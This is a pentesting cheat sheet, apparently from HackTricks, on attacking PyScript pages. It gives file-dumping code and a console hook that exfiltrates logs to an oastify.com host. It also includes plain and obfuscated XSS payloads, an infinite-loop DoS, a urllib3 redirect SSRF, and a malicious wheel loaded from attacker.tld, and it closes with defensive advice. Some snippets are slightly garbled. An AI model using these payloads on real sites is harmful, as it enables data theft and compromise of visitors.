# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Guide

PyScriptは、PythonをHTMLに統合し、HTMLとともに使用できるようにするために開発された新しいframeworkです。このcheat sheetでは、penetration testingの目的でPyScriptを使用する方法を説明します。

### Emscripten virtual memory filesystemからのファイルのDumping / Retrieving：

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
結果:

![PyScript Pentesting Guide - Emscripten 仮想メモリファイルシステムからのファイルのダンプ / 取得: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten 仮想メモリファイルシステムの OOB Data Exfiltration（コンソール監視）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
コード:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Result:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting（通常）

コード:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
結果:

![Emscripten 仮想メモリファイルシステムの OOB Data Exfiltration（コンソール監視） - Cross Site Scripting（通常）: Cross Site Scripting（Python Obfuscated）](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

コード:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
結果:

![Cross Site Scripting (通常) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

コード:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Result:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

コード:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
結果:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 新しい脆弱性と techniques（2023-2025）

### Server-Side Request Forgery（制御されていないリダイレクト経由）（CVE-2025-50182）

`urllib3 < 2.5.0` は、PyScript に同梱されている **Pyodide runtime 内**で実行される場合、`redirect` および `retries` パラメータを無視します。攻撃者が target URL に影響を与えられる場合、開発者が明示的に無効化していても、Python code に cross-domain redirect を強制的に追従させることができます。これは実質的に anti-SSRF logic をバイパスします。<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
`urllib3 2.5.0` で修正済み - PyScript image 内の package を upgrade するか、`packages = ["urllib3>=2.5.0"]` で安全なバージョンを pin してください。詳細については公式の CVE エントリを参照してください。

### 任意の package 読み込みと supply-chain attacks

PyScript では `packages` list に任意の URL を指定できるため、configuration を変更または注入できる malicious actor は、被害者の browser 上で **完全に任意の Python** を実行できます。
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Pure-Python wheels のみが必要です。WebAssembly の compilation step は不要です。* Configuration が user-controlled になっていないことを確認し、HTTPS と SRI hashes を使用して、trusted wheels を自分の domain でホストしてください。

### Output sanitisation changes (2023+)

* `print()` は引き続き raw HTML を inject するため、XSS に対して脆弱です（上記の例を参照）。
* 新しい `display()` helper はデフォルトで HTML を escape します。raw markup は `pyscript.HTML()` でラップする必要があります。
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
この挙動は2023年に導入され、公式の Built-ins guide に記載されています。信頼できない入力には `display()` を使用し、`print()` を直接呼び出すのは避けてください。<sup>[[2]](#references)</sup>

---

## 防御のベストプラクティス

* **パッケージを最新に保つ** – `urllib3 >= 2.5.0` にアップグレードし、site に同梱される wheel を定期的に再ビルドする。
* **パッケージソースを制限する** – PyPI の名前または same-origin URL のみを参照し、可能であれば Sub-resource Integrity (SRI) で保護する。
* **Content Security Policy を強化する** – inline JavaScript (`script-src 'self' 'sha256-…'`) を禁止し、挿入された `<script>` ブロックが実行されないようにする。
* **ユーザーが指定した `<py-script>` / `<script type="py">` タグを禁止する** – 他のユーザーに返す前に、サーバー上で HTML をサニタイズする。
* **worker を分離する** – worker から DOM への同期アクセスが不要な場合は、`SharedArrayBuffer` のヘッダー要件を回避するために `sync_main_only` フラグを有効にする。

## 参考文献

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins ドキュメント – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
